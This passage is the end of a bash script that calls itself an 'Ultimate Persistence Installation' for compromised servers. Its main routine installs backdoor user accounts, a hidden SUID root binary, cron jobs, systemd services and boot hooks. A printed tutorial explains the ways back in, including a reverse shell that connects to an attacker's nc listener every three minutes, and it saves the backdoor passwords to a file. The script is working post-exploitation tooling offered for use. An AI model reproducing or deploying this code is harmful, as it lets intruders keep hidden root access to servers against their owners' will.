        "root_pass": "$ROOT_PASS",
        "backdoor_user": "$BACKDOOR_USER",
        "backdoor_pass": "$BACKDOOR_PASS",
        "magic_token": "$MAGIC_TOKEN"
    },
    "key_type": "$KEY_TYPE",
    "key_file": "$KEY_FILE",
    "services_installed": ["persistent-shell", "ssh-tunnel", "watchdog"],
    "cron_jobs": ["reverse.sh", "keyguard.sh", "protect.sh"]
}
STATEJSON

    chmod 600 "$PERSIST_DIR/state.json"
    
    log "[✓] Credentials saved to $PERSIST_DIR/CREDENTIALS.txt"
}

show_final_summary() {
    log "[9/15] Generating final summary..."
    
    echo ""
    echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║              ✅ INSTALLATION COMPLETE! ✅                      ║${NC}"
    echo -e "${MAGENTA}╠══════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  📁 View Credentials:                                        ║${NC}"
    echo -e "${MAGENTA}║     cat $PERSIST_DIR/CREDENTIALS.txt                         ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  🔑 Quick Access Commands:                                   ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  1️⃣  SSH Login (Recommended):                                 ║${NC}"
    echo -e "${MAGENTA}║     ssh ${ROOT_USER}@<VPS_IP>                               ║${NC}"
    echo -e "${MAGENTA}║     Password: ${ROOT_PASS}                                    ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  2️⃣  Alternative SSH:                                        ║${NC}"
    echo -e "${MAGENTA}║     ssh ${BACKDOOR_USER}@<VPS_IP>                            ║${NC}"
    echo -e "${MAGENTA}║     Password: ${BACKDOOR_PASS}                                ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  3️⃣  SUID Backdoor (any user → root):                       ║${NC}"
    echo -e "${MAGENTA}║     /usr/local/bin/.debug --root                             ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  4️⃣  Via SSH Tunnel (from your machine):                    ║${NC}"
    echo -e "${MAGENTA}║     ssh -p ${SSH_PORT} root@localhost                        ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}║  5️⃣  Reverse Shell (listen on YOUR machine):                 ║${NC}"
    echo -e "${MAGENTA}║     sudo nc -lvnp ${ATTACKER_PORT}                           ║${NC}"
    echo -e "${MAGENTA}║                                                                ║${NC}"
    echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════════╝${NC}"
    
    echo ""
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}  📖 HOW TO ACCESS YOUR SERVER                                   ${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════════════════════════${NC}"
    
    cat << TUTORIAL

 ┌─────────────────────────────────────────────────────────────────────────────┐
 │                         📖 ACCESS TUTORIAL                                   │
 └─────────────────────────────────────────────────────────────────────────────┘

 ┌─ METHOD 1: DIRECT SSH LOGIN ────────────────────────────────────────────────┐
 │                                                                             │
 │  From your terminal:                                                        │
 │                                                                             │
 │      ssh sysadmin@SERVER_IP                                                 │
 │      Password: (shown above)                                                │
 │                                                                             │
 │  Example:                                                                   │
 │      ssh sysadmin@${CURRENT_IP:-<VPS_IP>}                                    │
 │                                                                             │
 └─────────────────────────────────────────────────────────────────────────────┘

 ┌─ METHOD 2: REVERSE SHELL (AUTOMATIC) ────────────────────────────────────────┤
 │                                                                             │
 │  The server connects back to you automatically every 3 minutes.             │
 │                                                                             │
 │  On YOUR machine (Terminal 1):                                              │
 │      sudo nc -lvnp ${ATTACKER_PORT}                                          │
 │                                                                             │
 │  Wait for connection... you get a root shell!                               │
 │                                                                             │
 └─────────────────────────────────────────────────────────────────────────────┘

 ┌─ METHOD 3: SSH TUNNEL (RECOMMENDED FOR RELIABILITY) ────────────────────────┐
 │                                                                             │
 │  After ~1 minute, tunnel is ready:                                          │
 │                                                                             │
 │      ssh -p ${SSH_PORT} root@localhost                                      │
 │                                                                             │
 │  This works even if server IP changes or has firewall!                     │
 │                                                                             │
 └─────────────────────────────────────────────────────────────────────────────┘

 ┌─ METHOD 4: SUID BACKDOOR (IF YOU HAVE ANY USER ACCESS) ────────────────────┐
 │                                                                             │
 │  If you can login with ANY user account:                                    │
 │                                                                             │
 │      /usr/local/bin/.debug --root                                           │
 │                                                                             │
 │  → Instant root shell!                                                      │
 │                                                                             │
 └─────────────────────────────────────────────────────────────────────────────┘

 ┌─ CHECK STATUS ON SERVER ──────────────────────────────────────────────────┐
 │                                                                            │
 │  After logging in, run:                                                    │
 │      status              → Show persistence status                         │
 │      maint               → Get root shell                                  │
 │      systemctl status persistent-shell ssh-tunnel watchdog                │
 │                                                                            │
 └────────────────────────────────────────────────────────────────────────────┘

TUTORIAL
}

# ============ MAIN INSTALLATION ============
main() {
    banner
    check_root
    
    log "Starting Ultimate Persistence Installation v${VERSION}..."
    log "Auto-detecting system configuration..."
    
    # Phase 0: Detect best key type (THE FIX!)
    detect_best_key_type
    
    # Phase 1: Access Guarantee
    echo -e "\n${YELLOW}[*] Phase 1: Access Guarantee${NC}"
    create_persistence_dirs
    install_ssh_keys
    install_backdoor_users
    install_suid_backdoor
    
    # Phase 2: Scheduled Tasks
    echo -e "\n${YELLOW}[*] Phase 2: Scheduled Tasks${NC}"
    install_cron_persistence
    
    # Phase 3: System Services
    echo -e "\n${YELLOW}[*] Phase 3: System Services${NC}"
    install_systemd_services
    
    # Phase 4: Boot Persistence
    echo -e "\n${YELLOW}[*] Phase 4: Boot Persistence${NC}"
    install_boot_persistence
    
    # Phase 5: Save Everything
    echo -e "\n${YELLOW}[*] Phase 5: Finalization${NC}"
    save_credentials
    show_final_summary
    
    echo ""
    log "=========================================="
    log "  ✅ INSTALLATION COMPLETE!"
    log "  All systems operational."
    log "=========================================="
}

# Run main function
main "$@"
